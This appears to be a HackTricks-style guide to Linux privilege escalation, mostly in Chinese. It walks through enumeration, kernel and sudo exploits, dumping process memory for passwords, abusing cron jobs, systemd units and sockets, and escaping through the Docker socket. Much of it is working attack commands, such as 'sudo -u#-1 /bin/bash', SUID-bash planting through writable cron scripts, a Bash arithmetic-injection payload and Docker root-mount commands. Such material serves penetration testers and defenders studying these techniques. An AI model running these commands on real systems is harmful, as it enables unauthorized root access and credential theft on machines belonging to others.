# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始收集有关正在运行的操作系统的信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对 `PATH` 变量中的任何文件夹有写权限**，你可能能够劫持某些库或二进制文件:
```bash
echo $PATH
```
### 环境信息

环境变量中有有趣的信息、密码或 API 密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的易受攻击内核列表以及一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可帮助查找内核漏洞利用的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害主机上执行，仅检查针对 kernel 2.x 的漏洞利用）

始终 **在 Google 上搜索内核版本**，也许某个内核漏洞利用中写明了你的内核版本，这样你就能确定该漏洞利用是否适用。

其他内核利用技术：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下内容中的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
您可以使用此 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

在 1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户在从用户可控目录使用 `/etc/nsswitch.conf` 文件时，通过 sudo 的 `--chroot` 选项将权限提升为 root。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，获取一个关于如何利用此 vuln 的**示例**。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列出可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试从中逃逸：


{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载和未挂载**、在哪里以及为什么。如果有任何未挂载的，你可以尝试将其挂载并检查是否包含敏感信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否已安装 **任何编译器**。如果你需要使用某些 kernel exploit，这非常有用，因为建议在你将要使用它的机器上（或在一台相似的机器上）对其进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装软件包和服务的版本**。也许存在某个旧版 Nagios（例如），可能被利用来提升权限…\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有 SSH 访问权限，你也可以使用 **openVAS** 来检查机器内已安装的软件是否过时或存在可被利用的漏洞。

> [!NOTE] > _注意：这些命令会显示大量大多无用的信息，因此建议使用 OpenVAS 或类似工具来检查已安装软件版本是否容易受到已知 exploits 的利用_

## 进程

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **超出其应有的权限**（例如可能由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
此外，**检查你对进程二进制文件的权限**，也许你可以覆盖某个二进制文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这在识别频繁执行的或在满足某些条件时被执行的易受攻击进程时非常有用。

### 进程内存

服务器上的某些服务会将 **credentials 以明文形式保存在内存中**。\
通常，读取属于其他用户的进程内存需要 **root privileges**，因此这通常在你已经是 root 并想发现更多 credentials 时更有用。\
但是，请记住，**作为普通用户你可以读取你所拥有的进程的内存**。

> [!WARNING]
> 请注意，如今大多数机器 **默认不允许 ptrace**，这意味着你无法转储属于其他未提升权限用户的进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 的经典工作方式。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有管理员可以使用 ptrace，因为它需要 CAP_SYS_PTRACE 权限。
> - **kernel.yama.ptrace_scope = 3**: 不允许使用 ptrace 跟踪任何进程。设置后需要重启才能再次启用 ptracing。

#### GDB

如果你能访问某个 FTP 服务的内存（例如），你可以获取 Heap 并在其中搜索 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的内存如何映射到其** 虚拟地址空间；它还显示 **每个映射区域的权限**。**mem** 伪文件 **暴露了进程的内存本身**。通过 **maps** 文件，我们可以知道哪些 **内存区域是可读的** 以及它们的偏移。我们使用这些信息来**在 mem 文件中定位并转储所有可读区域**到一个文件中。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对来自 Sysinternals 工具套件中用于 Windows 的经典 ProcDump 工具在 Linux 上的重新构想。获取地址 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动去除 root 的要求并转储由你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 来自进程内存的凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
您可以 dump the process（参见前面的章节以了解 dump the memory of a process 的不同方法）并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**，并从一些**已知文件**中窃取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称             |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

如果一个 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行且仅绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它，并创建一个 privileged job 来进行 escalate。

Typical chain
- 发现仅在 loopback 上的端口（例如 127.0.0.1:8000）及 Basic-Auth realm，使用 `ss -ntlp` / `curl -v localhost:8000`
- 在操作工件中查找凭证：
- 备份/脚本（使用 `zip -P <password>`）
- systemd 单元暴露了 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个 high-priv job 并立即运行（会放置 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它:
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；应使用专用用户并赋予最小权限约束
- 将绑定限制到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit 文件中嵌入 secrets；使用 secret stores 或仅限 root 的 EnvironmentFile
- 为按需作业执行启用审计/日志记录



检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln？能否修改 root 使用的文件？使用 symlinks？在 root 使用的目录中创建特定文件？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH： _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 具有写权限_)

如果在这个 crontab 中 root 尝试在不设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过使用以下方式获取 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果由 root 执行的脚本在某个命令中包含 “**\***”，你可以利用这一点来触发意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面是像** _**/some/path/\***_ **这样的路径，则它不易受到利用（即使** _**./\***_ **也不）。**

有关更多通配符利用技巧，请阅读以下页面：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 中进行算术求值之前，会先执行参数展开和命令替换。如果一个 root cron/parser 读取不受信任的日志字段并将其传入算术上下文，攻击者可以注入一个命令替换 $(...)，当 cron 运行时该命令会以 root 身份执行。

- 为什么这会奏效：在 Bash 中，展开发生的顺序是：参数/变量展开、命令替换、算术展开，然后是单词分割和路径名扩展。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），然后剩下的数字 `0` 被用于算术运算，从而让脚本继续而不报错。

- 典型的易受攻击模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方法：让攻击者可控的文本被写入被解析的日志，使看似数字的字段包含命令替换并以数字结尾。确保你的命令不会向 stdout 打印（或将其重定向），以保持算术表达式有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你**能修改由 root 执行的 cron 脚本**，你可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个你拥有 **完全访问权限的目录**，那么删除该文件夹并 **创建一个指向另一个由你控制并提供脚本的目录的 symlink 文件夹** 可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 自定义签名的 cron 二进制（可写载荷）
Blue teams 有时会通过导出自定义 ELF 段并在以 root 身份执行之前用 grep 查找厂商字符串来“签署”由 cron 驱动的二进制文件。如果该二进制文件是 group-writable（例如，`/opt/AV/periodic-checks/monitor` 属于 `root:devs 770`）且你可以 leak 签名材料，你可以伪造该段并劫持 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era 中，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用 leaked key/config（来自 `signing.zip`）重建预期证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建恶意替换（例如，drop a SUID bash，add your SSH key）并将证书嵌入 `.text_sig` 以使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留可执行位的情况下覆盖计划的二进制文件：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦天真的签名检查通过，你的载荷就会以 root 身份运行。

### 频繁的 cron 作业

你可以监控进程以查找每 1、2 或 5 分钟执行一次的进程。也许你可以利用它来提升权限。

例如，要 **在 1 分钟内每 0.1 秒监控一次**、**按执行次数较少排序**并删除那些已被执行次数最多的命令，你可以做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 不可见的 cron jobs

可以创建一个 cronjob，方法是在注释后放置回车符（不包含换行字符），该 cronjob 仍然会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，以便**在服务被** **启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。\  
例如在 `.service` 文件中创建你的 backdoor 并使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果你对**被服务执行的二进制文件拥有写权限**，你可以将它们替换为 backdoors，这样当服务被重新执行时，backdoors 就会被执行。

### systemd PATH - Relative Paths

你可以用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现可以在该路径的任意文件夹中**写入**，你可能能够**escalate privileges**。你需要搜索**在服务配置文件中使用的相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可写的 systemd PATH 目录中创建一个与该相对路径二进制同名的 **可执行文件**，并且当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **后门将被执行**（非特权用户通常无法启动/停止服务，但检查你是否可以使用 `sudo -l`）。

**通过 `man systemd.service` 了解有关服务的更多信息。**

## **定时器**

**定时器** 是 systemd 单元文件，其名称以 `**.timer**` 结尾，用于控制 `**.service**` 文件或事件。**定时器** 可作为 cron 的替代方案，因为它们内置对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令列举所有定时器：
```bash
systemctl list-timers --all
```
### 可写的定时器

如果你能修改一个定时器，你就可以让它执行某些已存在的 systemd.unit（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是什么：

> 在计时器到期时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为与计时器 unit 同名（后缀除外）的 service。（参见上文。）建议被激活的 unit 名称与计时器 unit 的名称相同，仅后缀不同。

因此，要滥用此权限你需要：

- 找到某个 systemd unit（例如 `.service`），该 unit 正在 **执行一个可写的二进制文件**
- 找到某个 systemd unit 正在 **执行相对路径**，并且你对 **systemd PATH** 拥有 **可写权限**（用于冒充该可执行文件）

**有关计时器的更多信息，请参阅 `man systemd.timer`.**

### **启用计时器**

要启用计时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)  
  `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项各有差异，但总体用于**指定将在哪监听**该 socket（例如 AF_UNIX 套接字文件的路径、要监听的 IPv4/IPv6 地址和/或端口等）。

- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.  
  `Accept`：接受布尔值。如果为 **true**，则为每个传入连接**生成一个 service 实例**，并且只将该连接的 socket 传递给该实例。如果为 **false**，所有监听套接字本身会被**传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。对于 datagram sockets 和 FIFOs，该值会被忽略——在这些情况下单个 service 单元无条件处理所有传入流量。**默认值为 false**。出于性能考虑，建议新守护进程以适配 `Accept=no` 的方式编写。

- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.  
  `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，分别在监听的 **sockets**/FIFO **创建并绑定之前**或**之后**被**执行**。命令行的第一个令牌必须是绝对文件名，后面跟随进程参数。

- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.  
  `ExecStopPre`、`ExecStopPost`：附加的**命令**，分别在监听的 **sockets**/FIFO **关闭并移除之前**或**之后**被**执行**。

- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.  
  `Service`：指定在**收到流量时**要**激活**的 **service** 单元名称。此设置仅允许用于 Accept=no 的 sockets。默认值为与 socket 同名（仅替换后缀）的 service。在大多数情况下，不需要使用此选项。

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_  

如果你发现一个**可写的** `.socket` 文件，你可以在 `[Socket]` 段的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的条目，backdoor 会在 socket 创建之前被执行。因此，你**可能需要等待机器重启**。\
_注意：系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.  

如果你**发现任何可写的 socket**（_此处指 Unix Sockets，而非配置 `.socket` 文件_），那么你可以与该 socket **通信**，并可能利用其中的漏洞。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意，可能存在一些 **sockets listening for HTTP** 请求（_我不是在指 .socket 文件，而是作为 unix sockets 的文件_）。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **对 HTTP 请求有响应**，那么你可以 **与之通信** 并可能 **利用某些漏洞**。

### 可写的 Docker socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写访问权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，并以 root 级别访问宿主机的文件系统。

#### **Using Docker API Directly**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令来操作 Docker socket。

1.  **List Docker Images:** 检索可用的镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求创建一个将宿主机根目录挂载进去的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 建立与容器的连接，从而在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以在容器中直接执行命令，从而以 root 级别访问宿主机文件系统。

### Others

注意，如果你对 docker socket 有写权限，因为你 **inside the group `docker`**，你有[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看 **more ways to break out from docker or abuse it to escalate privileges**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为 **you may be able to abuse it to escalate privileges**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 inter-Process Communication (IPC) 系统，允许应用程序高效地相互交互和共享数据。它为现代 Linux 系统设计，提供了应用间通信的健壮框架。

该系统用途广泛，支持增强的基本 IPC，以促进进程之间的数据交换，有点类似于增强版的 UNIX domain sockets。此外，它还支持事件或信号的广播，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的来电信号可以触发音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化了应用之间的服务请求和方法调用，简化了传统上复杂的流程。

D-Bus 基于一个 allow/deny 模型来运行，根据匹配的策略规则的累积效果来管理消息权限（方法调用、信号发射等）。这些策略指定了与 bus 的交互，可能通过滥用这些权限导致 privilege escalation。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了这样一个策略示例，详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有人，而 “default” 上下文策略适用于未被其他特定策略覆盖的所有主体。
```xml
<policy user="root">
